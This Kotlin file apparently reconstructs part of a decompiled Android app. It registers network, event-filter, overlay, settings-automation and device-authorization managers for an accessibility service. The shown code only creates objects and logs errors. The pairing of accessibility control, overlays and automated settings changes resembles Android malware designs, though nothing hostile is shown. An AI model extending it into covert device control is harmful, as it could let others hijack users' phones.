package com.storm.safe.rock.service.delegates.registrar

import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.ConfigProgressManager
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import com.storm.safe.rock.service.modules.EventFilterManager
import com.storm.safe.rock.service.modules.MainOrchestrator
import com.storm.safe.rock.service.modules.NetworkManager

/**
 * Core module registrar — creates the fundamental manager instances.
 *
 * Extracted from ServiceInitializer.initializeModules() (JADX: h2, line 6335).
 * Creates: NetworkManager, EventFilterManager, OverlayManager,
 *          ConfigProgressManager, MainOrchestrator, DeviceAuthorizationManager.
 */
class CoreModuleRegistrar : ModuleRegistrar {

    companion object {
        private const val TAG = "CoreModuleRegistrar"
    }

    override fun register(service: MyAccessibilityService) {
        // JADX: NetworkManager singleton
        try {
            val appContext = service.applicationContext
            val nm = NetworkManager()
            nm.initialize(appContext)
            service.networkManager = nm
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NetworkManager 初始化失败", e)
        }

        // JADX: C0614i9 — eventFilterManager (xz0 + C0614i9)
        try {
            val efm = EventFilterManager(service, service)
            service.eventFilterManager = efm
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ EventFilterManager 初始化失败", e)
        }

        // JADX: C0763km — configMaskManager → OverlayManager
        try {
            service.overlayManager = com.storm.safe.rock.service.modules.overlay.OverlayManager(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ OverlayManager 初始化失败", e)
        }

        // JADX: C0318a3 — configProgressManager
        try {
            val cpm = ConfigProgressManager(service.applicationContext)
            service.configProgressManager = cpm
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ConfigProgressManager 初始化失败", e)
        }

        // JADX: C0327b2 — mainOrchestrator (WRITE_SETTINGS automation)
        try {
            service.mainOrchestrator = MainOrchestrator(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ MainOrchestrator 初始化失败", e)
        }

        // JADX: C0329b4 — authorizationModule (DeviceAuthorizationManager)
        try {
            service.configStageManager = DeviceAuthorizationManager(service, service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ DeviceAuthorizationManager 初始化失败", e)
        }
    }
}
